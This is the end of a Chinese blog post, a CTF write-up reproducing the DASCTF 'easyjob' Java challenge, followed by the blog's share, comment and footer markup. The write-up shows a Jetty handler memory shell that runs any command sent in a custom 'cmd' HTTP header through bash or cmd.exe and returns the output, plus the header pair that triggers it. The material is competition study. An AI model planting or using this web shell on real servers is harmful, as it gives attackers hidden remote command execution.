class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然后我这边想用哥斯拉上马的，奈何不会，简单地分析了一下发现：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(String s, Request base, HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (request.getHeader(<span class="string">&quot;x-fuck-data&quot;</span>).equalsIgnoreCase(<span class="string">&quot;cmd&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (cmd != <span class="literal">null</span> &amp;&amp; !cmd.isEmpty()) &#123;</span><br><span class="line">                    String[] cmds = <span class="literal">null</span>;</span><br><span class="line">                    <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;;</span><br><span class="line">                    &#125;</span><br><span class="line">                    base.setHandled(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(<span class="string">&quot;\\ASADSADASDSADAS&quot;</span>).next();</span><br><span class="line">                    <span class="type">ServletOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">                    outputStream.write(result.getBytes());</span><br><span class="line">                    outputStream.flush();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<p>是的，只需要自定义请求头即可：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x-fuck-data: cmd</span><br><span class="line">cmd: whoami</span><br></pre></td></tr></table></figure>
<img src="/posts/52077/5.png" class title="awa">
<img src="/posts/52077/6.png" class title="awa">
<span class="blur">感受到对edge用户的恶意了</span>
</div>
        </div>
        
            <div class="kratos-copyright text-center clearfix">
                <h5 itemprop="copyrightNotice">本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
            </div>
        
        <footer class="kratos-entry-footer clearfix">
            
                <div class="post-like-donate text-center clearfix" id="post-like-donate">
                
                    <a class="donate" href="javascript:;"><i class="fa fa-bitcoin"></i> 打赏</a>
                
                
                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
                    <div class="share-wrap" style="display: none;">
    <div class="share-group">
        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-qq"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-star"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-weixin"></i>
            </div>
            <div class="share-int">
                <div class="qrcode" id="wechat-qr"></div>
                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
            </div>
        </a>
        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-weibo"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-facebook"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-twitter"></i>
            </div>
        </a>
    </div>
    <script type="text/javascript">
        $(()=>{
            new QRCode("wechat-qr", {
                text: "http://example.com/posts/52077.html",
                width: 150,
                height: 150,
                correctLevel : QRCode.CorrectLevel.H
            });
        });
        function share(dest) {
            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
            const weiboBase     = "https://service.weibo.com/share/share.php?";
            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
            const twitterBase   = "https://twitter.com/intent/tweet?";
            const hostUrl       = "http://example.com/posts/52077.html";
            const title         = "「dasctf暑期挑战赛easyjob复现」";
            const excerpt       = `这次java意外地能查到资料.jpg，然后以为得用jndi打，就不是很想做。哎，没想到不出网，淦。还有个很几把神经的原因就是十个靶机我全都打不开，摆了`;
            let _URL;
            switch (dest) {
                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
            }
            window.open(_URL);
        };
    </script>
</div>
                
                </div>
            
            <div class="footer-tag clearfix">
                <div class="pull-left">
                <i class="fa fa-tags"></i>
                    <a class="tag-none-link" href="/tags/Web/" rel="tag">Web</a>
                </div>
                <div class="pull-date">
                    <time datetime="2024-08-11T04:43:57.935Z" itemprop="dateModified">最后编辑：2024-08-11</time>
                </div>
            </div>
        </footer>
    </div>
    
        <nav class="navigation post-navigation clearfix" role="navigation">
            
            <div class="nav-previous clearfix">
                <a title=" CISCN ezjava另解" href="/posts/35553.html">&lt; 上一篇</a>
            </div>
            
            
            <div class="nav-next clearfix">
                <a title=" 流量分析学习" href="/posts/28398.html">下一篇 &gt;</a>
            </div>
            
        </nav>
    
    
        <div id="v-comments" class="post-comments bg-image"></div>
<script>
    var load_comm = () => {
        const init = () => {
            new Valine({
                el: '#v-comments',
                appId: 'bNjjbBH5XN8401rWT4xZhbCF-gzGzoHsz',
                appKey: 'R4c5rtiMieN1Kb3frShXDfw8',
                visitor: true,
                enableQQ: false,
                path: '/posts/52077.html'
                
            });
        }
        if (typeof Valine === 'undefined') {
            const src = '/vendors/valine@1.4.18/dist/Valine.min.js';
            $.getScript(src, init);
        } else {
            init();
        }
    };
</script>


<script>
<style>
    .v .veditor{min-height: 10rem;
        background-image: url(https://cdn.jsdelivr.net/gh/cungudafa/img/images/girls2.png);
        background-size: contain;
        background-repeat: no-repeat;
        background-position: right;
        background-color: rgba(255,255,255,0);
        resize: none;}
</style>
</script>


    <script>
        new Valine({
            el: '#vcomments',
            lang: 'zh-cn',
            admin_email: '83635877@qq.com',//博主邮箱
            appId: "",
            appKey: "",
            path: window.location.pathname,
            comment_count: true,
            //notify: false, // 邮件提醒!使用第三方就不要添加这个!!
            //verify: true, //验证码
            avatar: 'monsterid',//小怪物头像
            placeholder: "qwq~"
        });
        
</script>
    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
    <script type="text/javascript">
        jinrishici.load(function(result) {
            var jrsc_plac =  result.data.content + "\n「" + result.data.origin.title + "」" + result.data.origin.dynasty + " · " + result.data.origin.author;
            document.getElementById("veditor").setAttribute("placeholder",jrsc_plac);
        })
    </script>

<noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://valine.js.org/">comments powered by Valine.</a></noscript>

    
</article>

        

            </section>

        

        <script src="./js/src/Valine.min.js"></script>   
        
        
            

<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
    
    
                <aside id="krw-about" class="widget widget-kratos-about clearfix">
    <div class="photo-background"></div>
    <div class="photo-wrapper clearfix">
        <div class="photo-wrapper-tip text-center">
            <img class="about-photo" src="/images/touxiang.png" loading="lazy" decoding="auto" />
        </div>
    </div>
    <div class="textwidget">
        <p class="text-center"></p>
    </div>
    <div class="site-meta">
        <a class="meta-item" href="/archives/">
            <span class="title">
                文章
            </span>
            <span class="count">
                79
            </span>
        </a>
        <a class="meta-item" href="/categories/">
            <span class="title">
                分类
            </span>
            <span class="count">
                12
            </span>
        </a>
        <a class="meta-item" href="/tags/">
            <span class="title">
                标签
            </span>
            <span class="count">
                14
            </span>
        </a>
    </div>
</aside>
            
                    <div class="sticky-area">
                
                
  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Misc/">-CTF Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">20</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/java/">java</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Misc/">CTF Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web/">CTF Web</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web-WriteUp/">CTF Web WriteUp</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-WriteUp/">CTF WriteUp</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Intro/">Intro</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/">Java</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/">java</a><span class="category-list-count">12</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A%E7%B3%BB%E5%88%97/">不务正业系列</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">基础漏洞</a><span class="category-list-count">16</span></li></ul>
  </aside>


            
                
  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
      <div class="tag-clouds">
        <a href="/tags/Introduce-Myself/" style="font-size: 0.6em;">Introduce_Myself</a> <a href="/tags/Java/" style="font-size: 0.6em;">Java</a> <a href="/tags/Misc/" style="font-size: 0.63em;">Misc</a> <a href="/tags/POST/" style="font-size: 0.69em;">POST</a> <a href="/tags/RCE/" style="font-size: 0.69em;">RCE</a> <a href="/tags/SQL-Injection/" style="font-size: 0.71em;">SQL_Injection</a> <a href="/tags/Upload/" style="font-size: 0.6em;">Upload</a> <a href="/tags/Web/" style="font-size: 0.8em;">Web</a> <a href="/tags/awd/" style="font-size: 0.66em;">awd</a> <a href="/tags/java/" style="font-size: 0.74em;">java</a> <a href="/tags/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A/" style="font-size: 0.6em;">不务正业</a> <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" style="font-size: 0.77em;">基础漏洞</a> <a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 0.6em;">杂项</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 0.66em;">渗透</a>
      </div>
  </aside>

            
                
  <aside id="krw-posts" class="widget widget-kratos-posts">
  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
  <div class="tab-content">
      <ul class="list-group">
        
        
          
          
            <a class="list-group-item" href="/posts/61598.html"><i class="fa  fa-book"></i> tornado原型链污染学习</a>
            
          
        
          
          
            <a class="list-group-item" href="/posts/24747.html"><i class="fa  fa-book"></i> 从2024巅峰极客的easy_java学习jdk17下的反序列化</a>
            
          
        
          
          
            <a class="list-group-item" href="/posts/42959.html"><i class="fa  fa-book"></i> ErloGrave 复现</a>
            
          
        
          
          
            <a class="list-group-item" href="/posts/27646.html"><i class="fa  fa-book"></i> 第四届长城杯网络安全大赛Web方向思路及题解</a>
            
          
        
          
          
            <a class="list-group-item" href="/posts/28510.html"><i class="fa  fa-book"></i> 真正的from LFI to RCE——CVE-2024-2961</a>
            
          
        
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
      </ul>
  </div>
  </aside>

            
    </div>
</section>

        
        </div>
    </div>
</div>
<footer>
    <div id="footer"  class="ap-lrc"  >
        <div class="container">
            <div class="row">
                <div class="col-md-6 col-md-offset-3 footer-list text-center">
                    <ul class="kratos-social-icons">
                        <li><a target="_blank" rel="nofollow" href="https://weibo.com/u/HyDr0genSpectRuM"><i class="fa fa-weibo"></i></a></li>
                        
                        
                        
                        
                        
                        
                        <li><a target="_blank" rel="nofollow" href="https://github.com/Err0r233"><i class="fa fa-github"></i></a></li>
                        
                    </ul>
                    <ul class="kratos-copyright">
                        <div>
                            <li>&copy; 2024 Err0r233 版权所有.</li>
                            <li>本站已运行<span id="span_dt">Loading...</span></li>
                        </div>
                        <div>
                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by Err0r2333.</li>
                        </div>
                        <div>
                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
                            <li>Hosted on <a href="https://github.io" target="_blank">Github Pages</a></li>
                        </div>
                        <div>
                            
                            
                        </div>
                        <div id="binft"></div>
  <script>
    var binft = function (r) {
      function t() {
        return b[Math.floor(Math.random() * b.length)]
      }  
      function e() {
        return String.fromCharCode(94 * Math.random() + 33)
      }
      function n(r) {
        for (var n = document.createDocumentFragment(), i = 0; r > i; i++) {
          var l = document.createElement("span");
          l.textContent = e(), l.style.color = t(), n.appendChild(l)
        }
        return n
      }
      function i() {
        var t = o[c.skillI];
        c.step ? c.step-- : (c.step = g, c.prefixP < l.length ? (c.prefixP >= 0 && (c.text += l[c.prefixP]), c.prefixP++) : "forward" === c.direction ? c.skillP < t.length ? (c.text += t[c.skillP], c.skillP++) : c.delay ? c.delay-- : (c.direction = "backward", c.delay = a) : c.skillP > 0 ? (c.text = c.text.slice(0, -1), c.skillP--) : (c.skillI = (c.skillI + 1) % o.length, c.direction = "forward")), r.textContent = c.text, r.appendChild(n(c.prefixP < l.length ? Math.min(s, s + c.prefixP) : Math.min(s, t.length - c.skillP))), setTimeout(i, d)
      }
      var l = "",
      o = ["青青陵上柏，磊磊涧中石。", "人生天地间，忽如远行客。","斗酒相娱乐，聊厚不为薄。", "驱车策驽马，游戏宛与洛。","洛中何郁郁，冠带自相索。","长衢罗夹巷，王侯多第宅。","两宫遥相望，双阙百余尺。","极宴娱心意，戚戚何所迫？"].map(function (r) {
      return r + ""
      }),
      a = 2,
      g = 1,
      s = 5,
      d = 75,
      b = ["rgb(110,64,170)", "rgb(150,61,179)", "rgb(191,60,175)", "rgb(228,65,157)", "rgb(254,75,131)", "rgb(255,94,99)", "rgb(255,120,71)", "rgb(251,150,51)", "rgb(226,183,47)", "rgb(198,214,60)", "rgb(175,240,91)", "rgb(127,246,88)", "rgb(82,246,103)", "rgb(48,239,130)", "rgb(29,223,163)", "rgb(26,199,194)", "rgb(35,171,216)", "rgb(54,140,225)", "rgb(76,110,219)", "rgb(96,84,200)"],
      c = {
        text: "",
        prefixP: -s,
        skillI: 0,
        skillP: 0,
        direction: "forward",
        delay: a,
        step: g
      };
      i()
      };
      binft(document.getElementById('binft'));
  </script>
                    </ul>
                </div>
            </div>
        </div>
        <div class="kr-tool text-center">
            <div class="tool">
                
                    <div class="box search-box">
                        <a href="/search/">
                            <span class="fa fa-search"></span>
                        </a>
                    </div>
                
                
                    <div class="box theme-box" id="darkmode-switch">
                        <span class="fa fa-adjust"></span>
                    </div>
                
                
            </div>
            <div class="box gotop-box">
                <span class="fa fa-chevron-up"></span>
            </div>
        </div>
    </div>
</footer>
</div>
</div>


        <script defer src="/vendors/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
<script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
<script>
    if (!window.kr) {
        window.kr = {};
    }
    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
    window.kr.siteRoot = "/";
</script>

    <div>
        <canvas id="snow"></canvas>
        <script async src="/js/snow.min.js"></script>
    </div>


    <script async src="/js/candy.min.js"></script>



    <script defer src="/vendors/aplayer@1.10.1/dist/APlayer.min.js"></script>
    
    <script defer src="/vendors/meting@2.0.1/dist/Meting.min.js"></script>
    <meting-js
        server="netease"
        type="playlist"
        id="7733928587"
        order="random"
        fixed="true"
    >
    </meting-js>



    <script defer src="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>

<script defer src="/vendors/clipboard@2.0.6/dist/clipboard.min.js"></script>
<script defer src="/js/kratosr.min.js"></script>
<script defer src="/js/pjax.min.js"></script>

    <script defer src="/vendors/layui-src@2.5.5/dist/layui.all.js"></script>



<!-- Extra support for third-party plguins  -->



    </body>
</html>